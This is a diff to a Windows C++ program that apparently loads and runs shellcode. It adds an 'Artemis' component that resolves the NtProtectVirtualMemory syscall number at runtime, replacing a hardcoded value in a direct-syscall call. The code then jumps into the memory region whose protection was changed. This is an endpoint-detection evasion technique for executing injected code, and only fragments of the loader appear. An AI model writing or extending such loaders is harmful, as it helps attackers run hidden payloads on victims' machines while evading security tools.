@@ -1,6 +1,7 @@
 // main.cpp
 #include <iostream>
 #include <Windows.h>
+#include "../artemis.cpp"  // Local Header
 
 #define NT_SUCCESS(Status) ((NTSTATUS)(Status) >= 0)
 
@@ -21,6 +22,10 @@ extern "C" NTSTATUS NtProtectVirtualMemory(HANDLE ProcessHandle,
                                            int syscallID);
 
 extern "C" void jumper(UINT64* location);
+
+Artemis artemis;
+
+int syscallID = artemis.controller("NtProtectVirtualMemory");
 
 int main() {
 
@@ -74,7 +79,7 @@ int main() {
     // Call the NtProtectVirtualMemory syscall from the assembly file
     ULONG oldProtect;
     NTSTATUS status = NtProtectVirtualMemory(GetCurrentProcess(), &baseAddress,
-                                             &regionSize, protect, &oldProtect, 0x50);
+                                             &regionSize, protect, &oldProtect, syscallID);
 
     printf("jumperr");
     jumper((UINT64*)baseAddress);
